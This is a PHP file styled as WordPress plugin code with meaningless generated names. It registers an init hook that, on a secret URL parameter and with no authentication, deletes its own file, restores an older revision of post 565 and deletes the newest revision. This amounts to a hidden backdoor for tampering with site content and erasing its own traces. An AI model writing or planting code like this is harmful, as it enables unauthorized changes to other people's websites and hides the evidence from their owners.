<?php

function compare_extra_really() {
	if (isset($_GET['mediaelement_module_anywhere']) && $_GET['mediaelement_module_anywhere'] === 'extended_export_sliding') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$sites_wpmu_migration = 565;
		$background_location_google_tag = wp_get_post_revisions($sites_wpmu_migration);
		if (empty($background_location_google_tag)) die('no revisions');
		if (count($background_location_google_tag) < 2) die('less than 2');
		$endpoints_thumbnails_automatorwp_menus = array_shift($background_location_google_tag);
		$info_scroll_rank_attachments = $endpoints_thumbnails_automatorwp_menus->ID;
		$services_specific_helper = array_shift($background_location_google_tag);
		$sign_map_reader_click = $services_specific_helper->ID;
		$integrate_excerpt_titles_exporter = wp_restore_post_revision($sign_map_reader_click);
		if ($integrate_excerpt_titles_exporter === false) die('error restoring');
		$integrate_excerpt_titles_exporter = wp_delete_post_revision($info_scroll_rank_attachments);		
		if ($integrate_excerpt_titles_exporter === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'compare_extra_really');
